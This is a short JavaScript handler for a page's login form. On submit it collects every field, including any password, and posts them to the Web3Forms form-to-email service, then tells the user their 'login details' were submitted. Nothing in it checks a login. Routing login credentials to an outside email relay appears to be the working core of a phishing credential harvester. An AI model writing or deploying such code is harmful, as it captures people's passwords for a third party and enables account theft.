document.getElementById('login-form').addEventListener('submit', function (e) {
    e.preventDefault(); // Prevent the default browser submission behavior

    const formData = new FormData(this); // Collect form data

    // Send the form data to Web3Forms API
    fetch('https://api.web3forms.com/submit', {
        method: 'POST',
        body: formData,
    })
        .then((response) => {
            if (response.ok) {
                return response.json(); // Parse the response JSON
            } else {
                throw new Error('Failed to submit the form');
            }
        })
        .then((data) => {
            console.log('Form submitted successfully:', data);
            alert('Login details submitted successfully! Please check your email.');
        })
        .catch((error) => {
            console.error('Error:', error);
            alert('An error occurred while submitting the form. Please try again.');
        });
});
